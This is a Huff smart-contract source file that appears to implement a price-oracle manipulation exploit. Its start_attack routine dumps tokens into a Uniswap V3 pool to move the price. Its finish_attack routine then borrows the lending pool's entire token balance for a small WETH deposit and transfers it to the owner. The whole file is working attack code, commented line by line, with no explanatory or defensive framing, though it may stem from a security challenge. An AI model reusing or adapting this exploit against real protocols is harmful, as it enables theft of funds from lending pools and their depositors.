// Storage
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant ROUTER_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_SLOT = FREE_STORAGE_POINTER()
#define constant TOKEN_SLOT = FREE_STORAGE_POINTER()
#define constant WETH_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x80            // [0x80, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x80, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> swap router address

    0x20            // [0x20] - size code we will copy (address)
    0x60            // [0x60, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x60, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x20, offset, 0x20] - byte offset in memory where code will be copied to
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> swap router address
    // [OFFSET 0x20]  000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool address

    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x40, offset, 0x20] - byte offset in memory where code will be copied to
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> swap router address
    // [OFFSET 0x20]  000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool address
    // [OFFSET 0x40]  000000000000000000000000c072c85922b7233998b2ab990fefde80218ca63f -> token address

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x60, offset, 0x20] - byte offset in memory where code will be copied to
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> swap router address
    // [OFFSET 0x20]  000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool address
    // [OFFSET 0x40]  000000000000000000000000c072c85922b7233998b2ab990fefde80218ca63f -> token address
    // [OFFSET 0x60]  000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc -> weth address

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [router] - copied router onto stack from byte offset 0x00 in mem
    [ROUTER_SLOT]   // [0x01, router] - storage slot where to store router
    sstore          // [] - copied router to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> router address

    0x20            // [0x20] - byte offset in memory
    mload           // [pool] - copied pool onto stack from byte offset 0x20 in mem
    [POOL_SLOT]     // [0x02, pool] - storage slot where to store pool
    sstore          // [] - copied pool to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> router address
    // [SLOT 0x02] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool address

    0x40            // [0x40] - byte offset in memory
    mload           // [token] - copied pool onto stack from byte offset 0x40 in mem
    [TOKEN_SLOT]    // [0x03, token] - storage slot where to store token
    sstore          // [] - copied token to storage slot 0x03

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> router address
    // [SLOT 0x02] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool address
    // [SLOT 0x03] 000000000000000000000000c072c85922b7233998b2ab990fefde80218ca63f -> token address

    0x60            // [0x60] - byte offset in memory
    mload           // [weth] - copied pool onto stack from byte offset 0x60 in mem
    [WETH_SLOT]     // [0x04, weth] - storage slot where to store weth
    sstore          // [] - copied weth to storage slot 0x04

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> router address
    // [SLOT 0x02] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool address
    // [SLOT 0x03] 000000000000000000000000c072c85922b7233998b2ab990fefde80218ca63f -> token address
    // [SLOT 0x04] 000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc -> weth address
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here if the caller is the owner
}

#define macro START_ATTACK() = takes (0) returns (0) {
    // Copy `balanceOf(address)` func sig and self into mem to use as calldata for STATICCALL
    0x70a08231              // [0x70a08231] - func sig
    0x60                    // [0x60, 0x70a08231] - byte offset in mem
    mstore                  // [] - copied func sig into mem at offset 0x60

    address                 // [self]
    msize                   // [0x80, self]
    mstore                  // [] - copied self into mem at offset 0x80

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000000000000
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x80]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self

    // STATICCALL into token
    [TOKEN_SLOT]             // [0x03] - storage slot where token is
    sload                    // [token] - copied token onto stack 
    0x20                     // [0x20, token] - size of return data
    0xc0                     // [0xc0, 0x20, token] - byte offset in mem where return data is copied
    0x24                     // [0x24, 0xc0, 0x20, token] - size of calldata
    0x7c                     // [0x7c, 0x24, 0xc0, 0x20, token] - byte offset in mem where calldata starts
    dup5                     // [token, 0x7c, 0x24, 0xc0, 0x20, token] - calling token
    gas                      // [gas, token, 0x7c, 0x24, 0xc0, 0x20, token] - gas to send with staticcall
    staticcall               // [success, token]
    iszero                   // [0/1, token]
    throw_error              // [throw_error, 0/1, token]
    jumpi                    // [token]

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000000000000
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x80]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0xc0]   000000000000000000000000000000000000000000000005f68e8131ecf80000 -> amountIn

    // Copy `approve(address,uint256)` and router into mem to use as calldata for CALL
    0x095ea7b3               // [0x095ea7b3, token] - func sig
    0x80                     // [0x80, 0x095ea7b3, token] - byte offset in mem
    mstore                   // [token] - copied func sig into mem at offset 0x80

    [ROUTER_SLOT]            // [0x01, token] - storage slot where router is
    sload                    // [router, token] - copied router onto stack
    dup1                     // [router, router, token]
    0xa0                     // [0xa0, router, router, token] - byte offset in mem
    mstore                   // [router, token] - copied router into mem at offset 0xa0

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000000000000
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000000000000000095ea7b3 -> `approve(address,uint256)` func sig
    // [OFFSET 0xa0]   000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564 -> router 
    // [OFFSET 0xc0]   000000000000000000000000000000000000000000000005f68e8131ecf80000 -> amountIn

    // CALL into token
    0x00                      // [0x00, router, token] - size of return data
    dup1                      // [0x00, 0x00, router, token] - byte offset in mem where return data is copied
    0x44                      // [0x44, 0x00, 0x00, router, token] - size of calldata
    0x9c                      // [0x9c, 0x44, 0x00, 0x00, router, token] - byte offset in mem where calldata starts
    dup3                      // [0x00, 0x9c, 0x44, 0x00, 0x00, router, token] - msg.value to send with call
    dup7                      // [token, 0x00, 0x9c, 0x44, 0x00, 0x00, router, token] - calling token
    gas                       // [gas, token, 0x00, 0x9c, 0x44, 0x00, 0x00, router, token] - gas to send with call
    call                      // [success, router, token]
    iszero                    // [0/1, router, token]
    throw_error               // [throw_error, 0/1, router, token]
    jumpi                     // [router, token]

    // Copy `exactInputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))` and params into mem to use as calldata for CALL
    // param is a struct so the calldata is built easily: one arg after another
    0x414bf389                // [0x414bf389, router, token] - func sig
    0x00                      // [0x00, 0x414bf389, router, token] - byte offset in mem
    mstore                    // [router, token] - copied func sig into mem at offset 0x00

    swap1                     // [token, router]
    0x20                      // [0x20, token, router] - byte offset in mem
    mstore                    // [router] - copied token into mem at offset 0x20

    [WETH_SLOT]               // [0x04, router] - storage slot where weth is
    sload                     // [weth, router] - copied weth onto stack
    0x40                      // [0x40, weth, router] - byte offset in mem
    mstore                    // [router] - copied weth into mem at offset 0x40

    0xbb8                     // [0xbb8, router] - fee
    0x60                      // [0x60, 0xbb8, router] - byte offset in mem
    mstore                    // [router] - copied fee into mem at offset 0x60

    address                   // [address, router]
    0x80                      // [0x80, address, router]
    mstore                    // [router] - copied address into mem at offset 0x80

    timestamp                 // [timestamp, router]
    0xa0                      // [0xa0, timestamp, router] - byte offset in mem
    mstore                    // [router] - copied the timestamp into mem at offset 0xa0

    // Final memory
    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000414bf389 -> `exactInputSingle` func sig
    // [OFFSET 0x20]   000000000000000000000000c072c85922b7233998b2ab990fefde80218ca63f -> token
    // [OFFSET 0x40]   000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 -> weth
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000bb8 -> fee (uint24)
    // [OFFSET 0x80]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self
    // [OFFSET 0xa0]   00000000000000000000000000000000000000000000000000000000631408b4 -> timestamp
    // [OFFSET 0xc0]   000000000000000000000000000000000000000000000005f68e8131ecf80000 -> amountIn
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000000 -> amountOutMinumum (empty)
    // [OFFSET 0x100]  0000000000000000000000000000000000000000000000000000000000000000 -> sqrtPriceLimitX96 (empty)

    // CALL into router
    0x00                       // [0x00, router] - size of return data
    dup1                       // [0x00, 0x00, router] - byte offset in mem where return data is copied
    0x104                      // [0x104, 0x00, 0x00, router] - size of calldata
    0x1c                       // [0x1c, 0x104, 0x00, 0x00, router] - byte offset in mem where calldata starts
    dup3                       // [0x00, 0x1c, 0x104, 0x00, 0x00, router] - msg.value to send with call
    dup6                       // [router, 0x00, 0x1c, 0x104, 0x00, 0x00, router] - calling router
    gas                        // [gas, router, 0x00, 0x1c, 0x104, 0x00, 0x00, router]
    call                       // [success, router]
    iszero                     // [0/1, router]
    throw_error                // [throw_error, 0/1, router]
    jumpi                      // [router]
    pop                        // []

    stop
}

#define macro FINISH_ATTACK() = takes (0) returns (0) {
    // Copy `balanceOf(address)` and pool into mem to use as calldata for STATICCALL
    0x70a08231                 // [0x70a08231] - func sig
    0x00                       // [0x00, 0x70a08231] - byte offset in mem
    mstore                     // [] - copied func sig into mem at offset 0x00
    
    [POOL_SLOT]                // [0x02] - storage slot where pool is
    sload                      // [pool] - copied pool onto stack
    dup1                       // [pool, pool]
    msize                      // [0x20, pool, pool] - byte offset in mem
    mstore                     // [pool]
    
    // MEMORY:
    // [OFFSET 0x00] 0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    
    // STATICCALL into token
    [TOKEN_SLOT]               // [0x03, pool] - storage slot where token is
    sload                      // [token, pool] - copied token onto stack
    0x20                       // [0x20, token, pool] - size of return data
    0x80                       // [0x80, 0x20, token, pool] - byte offset in mem where return data is copied
    0x24                       // [0x24, 0x80, 0x20, token, pool] - size of calldata
    0x1c                       // [0x1c, 0x24, 0x80, 0x20, token, pool] - byte offset in mem where calldata starts
    dup5                       // [token, 0x1c, 0x24, 0x80, 0x20, token, pool] - calling token
    gas                        // [gas, token, 0x1c, 0x24, 0x80, 0x20, token, pool] - gas to send with staticcall
    staticcall                 // [success, token, pool]
    iszero                     // [0/1, token, pool]
    throw_error                // [throw_error, 0/1, token, pool]
    jumpi                      // [token, pool]

    // MEMORY:
    // [OFFSET 0x00] 0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    // [OFFSET 0x40] 0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x60] 0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x80] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (balanceOf(pool))
    
    // Copy `calculateDepositOfWETHRequired(uint256)` into mem to use as calldata for STATICCALL (param is return data from balanceOf)
    0xc4bd83fa                  // [0xc4bd83fa, token, pool] - func sig
    0x60                        // [0x60, 0xc4bd83fa, token, pool] - byte offset in mem
    mstore                      // [token, pool] - copied func sig into mem at offset 0x60

    // MEMORY:
    // [OFFSET 0x00] 0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    // [OFFSET 0x40] 0000000000000000000000000000000000000000000000000000000000000000 
    // [OFFSET 0x60] 00000000000000000000000000000000000000000000000000000000c4bd83fa -> `calculateDepositOfWETHRequired(uint256)` - func sig
    // [OFFSET 0x80] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (balanceOf(pool))

    // STATICCALL into pool
    0x20                       // [0x20, token, pool] - size of return data
    0x40                       // [0x40, 0x20, token, pool] - byte offset in mem where return data is copied
    0x24                       // [0x24, 0x40, 0x20, token, pool] - size of calldata
    0x7c                       // [0x7c, 0x24, 0x40, 0x20, token, pool] - byte offset in mem where calldata starts
    dup6                       // [pool, 0x7c, 0x24, 0x40, 0x20, token, pool] - calling pool
    gas                        // [gas, pool, 0x7c, 0x24, 0x40, 0x20, token, pool] - gas to send with staticcall
    staticcall                 // [success, token, pool]
    iszero                     // [0/1, token, pool]
    throw_error                // [throw_error, 0/1, token, pool]
    jumpi                      // [token, pool]

    // MEMORY:
    // [OFFSET 0x00] 0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    // [OFFSET 0x40] 00000000000000000000000000000000000000000000000002ac1c04a5758a58 -> return data (weth_required)
    // [OFFSET 0x60] 00000000000000000000000000000000000000000000000000000000c4bd83fa -> `calculateDepositOfWETHRequired(uint256)` - func sig
    // [OFFSET 0x80] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (balanceOf(pool))

    // Copy `approve(address,uint256)` func sig func sig into mem to use as calldata for CALL (params are pool and return data from `calculateDepositOfWETHRequired`)
    0x095ea7b3                  // [0x095ea7b3, token, pool] - func sig
    0x00                        // [0x00, 0x095ea7b3, token, pool] - byte offset in mem
    mstore                      // [token, pool] - copied func sig into mem at offset 0x00

    [WETH_SLOT]                 // [0x04, token, pool] - storage slot where weth is
    sload                       // [weth, token, pool] - copied weth onto stack

    // MEMORY:
    // [OFFSET 0x00] 00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    // [OFFSET 0x40] 00000000000000000000000000000000000000000000000002ac1c04a5758a58 -> return data (weth_required)
    // [OFFSET 0x60] 00000000000000000000000000000000000000000000000000000000c4bd83fa -> `calculateDepositOfWETHRequired(uint256)` - func sig
    // [OFFSET 0x80] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (balanceOf(pool))
    
    // CALL into token
    0x00                      // [0x00, weth, token, pool] - size of return data
    dup1                      // [0x00, 0x00, weth, token, pool] - byte offset in mem where return data is copied
    0x44                      // [0x44, 0x00, 0x00, weth, token, pool] - size of calldata
    0x1c                      // [0x1c, 0x44, 0x00, 0x00, weth, token, pool] - byte offset in mem where calldata starts
    dup3                      // [0x00, 0x1c, 0x44, 0x00, 0x00, weth, token, pool] - msg.value to send with call
    dup6                      // [weth, 0x00, 0x1c, 0x44, 0x00, 0x00, weth, token, pool] - calling weth
    gas                       // [gas, weth, 0x00, 0x1c, 0x44, 0x00, 0x00, weth, token, pool] - gas to send with call
    call                      // [success, weth, token, pool]
    iszero                    // [0/1, weth, token, pool]
    throw_error               // [throw_error, 0/1, weth, token, pool]
    jumpi                     // [weth, token, pool]

    // Copy `borrow(uint256)` func sig into mem to use as calldata for CALL (param is return data from balanceOf)
    0xc5ebeaec                // [0xc5ebeaec, weth, token, pool] - func sig
    0x60                      // [0x60, 0xc5ebeaec, weth, token, pool] byte offset in mem
    mstore                    // [weth, token, pool] - copied func sig into mem at offset 0x60

    // MEMORY:
    // [OFFSET 0x00] 00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    // [OFFSET 0x40] 00000000000000000000000000000000000000000000000002ac1c04a5758a58 -> return data (weth_required)
    // [OFFSET 0x60] 00000000000000000000000000000000000000000000000000000000c5ebeaec -> `borrow(uint256)` - func sig
    // [OFFSET 0x80] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (balanceOf(pool))

    // CALL into pool
    0x00                      // [0x00, weth, token, pool] - size of return data
    dup1                      // [0x00, 0x00, weth, token, pool] - byte offset in mem where return data is copied
    0x24                      // [0x24, 0x00, 0x00, weth, token, pool] - size of calldata
    0x7c                      // [0x7c, 0x24, 0x00, 0x00, weth, token, pool] - byte offset in mem where calldata starts
    dup3                      // [0x00, 0x7c, 0x24, 0x00, 0x00, weth, token, pool] - msg.value to send with call
    dup8                      // [pool, 0x00, 0x7c, 0x24, 0x00, 0x00, weth, token, pool] - calling pool
    gas                       // [gas, pool, 0x00, 0x7c, 0x24, 0x00, 0x00, weth, token, pool] - gas to send with call
    call                      // [success, weth, token, pool]
    iszero                    // [0/1, weth, token, pool]
    throw_error               // [throw_error, 0/1, weth, token, pool]
    jumpi                     // [weth, token, pool]

    // Copy `transfer(address,uint256)` func sig and caller into mem to use as calldata for CALL
    0xa9059cbb                // [0xa9059cbb, weth, token, pool] - func sig
    0x40                      // [0x40, 0xa9059cbb, weth, token, pool] - byte offset in mem
    mstore                    // [weth, token, pool] - copied func sig into mem at offset 0x40

    caller                    // [owner, weth, token, pool] - msg.sender is owner due to modifier
    0x60                      // [0x60, owner, weth, token, pool] - byte offset in mem
    mstore                    // [weth, token, pool] - copied owner into mem at offset 0x60

    // MEMORY:
    // [OFFSET 0x00] 00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` func sig
    // [OFFSET 0x20] 000000000000000000000000a808f5bf86baa69d37eb058271de2bf2e3972a19 -> pool 
    // [OFFSET 0x40] 00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x60] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner
    // [OFFSET 0x80] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (balanceOf(pool))

    // CALL into token
    0x00                      // [0x00, weth, token, pool] - size of return data
    dup1                      // [0x00, 0x00, weth, token, pool] - byte offset in mem where return data is copied
    0x44                      // [0x44, 0x00, 0x00, weth, token, pool] - size of calldata
    0x5c                      // [0x5c, 0x44, 0x00, 0x00, weth, token, pool] - byte offset in mem where calldata starts
    dup3                      // [0x00, 0x5c, 0x44, 0x00, 0x00, weth, token, pool] - msg.value to send with call
    dup7                      // [token, 0x00, 0x5c, 0x44, 0x00, 0x00, weth, token, pool] - calling token
    gas                       // [gas, token, 0x00, 0x5c, 0x44, 0x00, 0x00, weth, token, pool] - gas to send with call
    call                      // [success, weth, token, pool]
    iszero                    // [0/1, weth, token, pool]
    throw_error               // [throw_error, 0/1, weth, token, pool]
    jumpi                     // [weth, token, pool]
    pop                       // [token, pool]
    pop                       // [pool]
    pop                       // []

    stop
}

#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0xbe3a81bb   // [0xbe3a81bb, func_sig, func_sig] - pushing func sig of 'start_attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    start        // [start, 0/1, func_sig] - start is a label (byte offset) for the start_attack instructions in the code
    jumpi        // [func_sig] - jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x87d6c8b4   // [0x87d6c8b4, func_sig, func_sig] - pushing func sig of 'finish_attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    finish       // [finish, 0/1, func_sig] - finish is a label (byte offset) for the finish_attack instructions in the code
    jumpi        // [func_sig] - jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    // Fallback
    callvalue    // [msg.value]
    iszero       // [0/1]
    throw_error  // [throw_error, 0/1]
    jumpi        // [] - will revert if msg.value is 0, else will return
    0x00         // [0x00] - size of return data
    0x00         // [0x00, 0x00] - byte offset in mem where return data starts
    return       // [] - return wit no data
    
    throw_error: // label for revert path
        0x00 0x00 revert

    start:       // label for attack instructions
        ONLY_OWNER()
        START_ATTACK()

    finish:      // label for attack instructions
        ONLY_OWNER()
        FINISH_ATTACK()
}
